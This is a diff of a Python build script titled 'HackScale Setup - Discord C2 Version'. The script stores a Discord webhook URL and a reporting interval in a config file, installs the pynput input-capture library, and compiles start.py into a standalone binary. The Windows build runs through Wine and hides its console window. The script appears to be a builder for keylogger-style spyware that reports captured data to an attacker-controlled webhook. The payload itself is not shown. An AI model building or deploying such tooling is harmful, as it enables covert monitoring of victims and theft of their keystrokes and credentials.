@@ -6,36 +6,41 @@ import subprocess
 import argparse
 from shutil import which
 
-# -----------------------------------------------
+# ==========================================
 def check_installed(program):
     return which(program) is not None
 
 def install_linux_pyinstaller():
-    print("[+] Installing PyInstaller for Linux...")
+    print("[+] Installing PyInstaller + requirements for Linux...")
     subprocess.run(["sudo", "apt", "update"])
     subprocess.run(["sudo", "apt", "install", "-y", "python3-pip"])
     subprocess.run(["pip3", "install", "--upgrade", "pip"])
-    subprocess.run(["pip3", "install", "pyinstaller", "requests", "pynput", "thread6"])
+    subprocess.run(["pip3", "install", "pyinstaller", "pynput", "thread6", "requests"])
 
-def install_wine_python311():
-    print("[+] Installing Python 3.11 inside Wine...")
-    subprocess.run(["wget", "https://www.python.org/ftp/python/3.11.4/python-3.11.4-amd64.exe", "-O", "python311.exe"])
-    subprocess.run(["wine", "msiexec", "/i", "python311.exe"])
-    subprocess.run(["wget", "https://bootstrap.pypa.io/get-pip.py", "-O", "get-pip.py"])
-    subprocess.run(['wine', "C:\\Python311\\python.exe", "get-pip.py"])
-    subprocess.run(['wine', "C:\\Python311\\python.exe", "-m", "pip", "install", "pyinstaller", "requests", "pynput", "thread6"])
+# ==========================================
+def find_wine_python311():
+    possible_paths = [
+        "C:\\Python311\\python.exe",
+        "C:\\Users\\root\\AppData\\Local\\Programs\\Python\\Python311\\python.exe",
+        "C:\\Program Files\\Python311\\python.exe",
+        "C:\\Program Files (x86)\\Python311\\python.exe"
+    ]
+    for path in possible_paths:
+        result = subprocess.run(["wine", path, "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        if result.returncode == 0:
+            return path
+    return None
 
-# -----------------------------------------------
+# ==========================================
 def main():
     parser = argparse.ArgumentParser(description="HackScale Setup - Discord C2 Version")
     parser.add_argument("--webhook", required=True, help="Discord webhook URL")
-    parser.add_argument("--interval", required=False, default=60, help="Reporting interval in seconds (default: 60)")
+    parser.add_argument("--interval", required=False, type=int, default=60, help="Reporting interval (sec)")
     parser.add_argument("--windows", action="store_true", help="Build Windows EXE with Wine Python 3.11")
     parser.add_argument("--linux", action="store_true", help="Build Linux binary")
 
     args = parser.parse_args()
 
-    # Save config
     with open("config.py", "w") as f:
         f.write(f'WEBHOOK_URL = "{args.webhook}"\n')
         f.write(f'INTERVAL = {args.interval}\n')
@@ -46,7 +51,7 @@ def main():
         print("[-] Please specify --windows or --linux")
         sys.exit(1)
 
-    # -----------------------------------------------
+    # ==========================================
     if args.windows:
         print("[+] Target: Windows")
 
@@ -54,35 +59,35 @@ def main():
             print("[-] Wine is not installed. Please install it first.")
             sys.exit(1)
 
-        possible_paths = [
-            "C:\\Python311\\python.exe",
-            "C:\\Users\\root\\AppData\\Local\\Programs\\Python\\Python311\\python.exe",
-            "C:\\Program Files\\Python311\\python.exe",
-            "C:\\Program Files (x86)\\Python311\\python.exe"
-        ]
+        python_installed = False
 
-        wine_python311 = None
+        while not python_installed:
+            wine_python = find_wine_python311()
 
-        for path in possible_paths:
-            result = subprocess.run(["wine", path, "--version"], stdout=subprocess.PIPE)
-            if result.returncode == 0:
-                wine_python311 = path
-                print(f"[+] Found Wine Python 3.11 at: {path}")
-                break
+            if wine_python:
+                print(f"[+] Found Python in Wine: {wine_python}")
+                python_installed = True
+            else:
+                print("[!] Python 3.11 not found inside Wine.")
+                if os.path.exists("python311.exe"):
+                    print("[+] Found local python311.exe, using it.")
+                else:
+                    print("[+] Downloading Python 3.11 installer...")
+                    subprocess.run(["wget", "https://www.python.org/ftp/python/3.11.4/python-3.11.4-amd64.exe", "-O", "python311.exe"])
 
-        if not wine_python311:
-            print("[!] Python 3.11 not found inside Wine. Installing...")
-            install_wine_python311()
-            wine_python311 = possible_paths[0]
+                print("[+] Starting Python installer inside Wine...")
+                subprocess.Popen(["wine", "python311.exe"]).wait()
+                input("[!] Please complete the installer wizard fully, then press Enter to re-check...")
 
-        print("[+] Checking required packages...")
-        subprocess.run(["wine", wine_python311, "-m", "pip", "install", "--upgrade", "pip"])
-        subprocess.run(["wine", wine_python311, "-m", "pip", "install", "pyinstaller", "requests", "pynput", "thread6"])
+        # ✅✅ بعد التثبيت تأكد من pip + pyinstaller + requests + pynput + thread6
+        print("[+] Checking & Installing required Python packages...")
+        subprocess.run(['wine', wine_python, "-m", "pip", "install", "--upgrade", "pip"])
+        subprocess.run(['wine', wine_python, "-m", "pip", "install", "pyinstaller", "pynput", "thread6", "requests"])
 
         print("[+] Building Windows EXE...")
-        subprocess.run(["wine", wine_python311, "-m", "PyInstaller", "--onefile", "--clean", "--noconsole", "start.py"])
+        subprocess.run(["wine", wine_python, "-m", "PyInstaller", "--onefile", "--clean", "--noconsole", "start.py"])
 
-    # -----------------------------------------------
+    # ==========================================
     if args.linux:
         print("[+] Target: Linux")
 
@@ -90,13 +95,13 @@ def main():
             print("[-] PyInstaller not found. Installing now...")
             install_linux_pyinstaller()
         else:
-            subprocess.run(["pip3", "install", "--upgrade", "requests", "pynput", "thread6"])
+            subprocess.run(["pip3", "install", "pynput", "thread6", "requests"])
 
         print("[+] Building Linux binary...")
         subprocess.run(["pyinstaller", "--onefile", "start.py"])
 
-    print("[+] All done! Check /dist/ for your output.")
+    print("[✔] All done! Check /dist/ for your output.")
 
-# -----------------------------------------------
+# ==========================================
 if __name__ == "__main__":
     main()
